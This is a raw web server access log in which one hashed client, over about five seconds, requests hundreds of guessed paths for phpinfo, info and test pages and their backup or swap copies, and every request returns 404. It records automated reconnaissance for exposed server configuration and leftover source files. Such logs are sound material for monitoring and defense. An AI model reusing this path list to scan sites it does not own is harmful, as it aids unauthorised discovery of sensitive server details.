043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/web/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/www/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/includes/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/phpinfo.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/phpinfo.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/www/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/test.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/admin/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/admin/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/site/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/test/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/test/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/php_info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/php_info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/php_info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/test.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/scripts/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/includes/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/tmp/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/test/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/phpinfo.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/admin/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/includes/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/test/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/dev/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/test.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/includes/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/dev/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/scripts/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/public/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/scripts/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/includes/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/scripts/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/dev/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/test.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/scripts/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/php_info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/php_info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/public/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/phpinfo.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/phpinfo.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/web/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/public/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/public/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/test.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/test.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/web/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/web/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/phpinfo.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/public/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/public/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/public/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/phpinfo.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/php_info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/_profiler/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/info1.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/php_info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/pi.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/info2.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/php.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:02;;/test.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/i.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/php_info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/serverinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/includes/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/dev/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/public/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/php_version.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/php_info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/dev/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/server.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/phpinfo.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/scripts/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/debug.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/dev/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/phpversion.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/scripts/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/scripts/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/web/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/test.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/scripts/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/public/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/phpinfo.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/includes/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/phptest.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/test.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/check.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/web/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/public/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/phpinfo.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/test/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/diagnostic.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/web/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/php_info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/test.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/php_info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/php_info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/tmp/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/test.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/php_info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/phpinfo.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/public/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/dev/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/php_info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/phpinfo.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/test.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/test.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/php_info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/test.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/test.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/php_info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/test.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/test.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/phpinfo.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/php_info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/test/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/phpinfo.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/test/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/admin/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/php_info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/admin/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/phpinfo.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/test/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/php_info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/admin/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/admin/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/test/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/phpinfo.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/test.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/php_info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/phpinfo.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/phpinfo.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/dev/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/php_info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/tmp/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/www/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/tmp/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/phpinfo.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/www/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/web/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/tmp/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/includes/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/www/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/phpinfo.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/includes/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/includes/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/www/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/includes/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/test.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/test.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/php_info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:03;;/php_info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:04;;/includes/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:04;;/scripts/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:04;;/public/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:04;;/public/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:04;;/scripts/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:04;;/scripts/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:04;;/scripts/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:04;;/web/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:04;;/web/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:04;;/web/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:04;;/scripts/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:04;;/public/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:04;;/public/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:04;;/scripts/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:04;;/scripts/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:04;;/web/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:04;;/public/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:04;;/public/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:04;;/public/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:04;;/scripts/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:04;;/public/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:04;;/public/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:04;;/includes/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:04;;/includes/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:04;;/web/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:04;;/web/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:04;;/scripts/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:04;;/includes/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:04;;/includes/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:04;;/php_info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:04;;/scripts/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:04;;/includes/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:04;;/scripts/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:04;;/web/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:05;;/scripts/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:05;;/www/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:05;;/www/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:05;;/public/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:05;;/public/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:05;;/www/info.php;GET;404
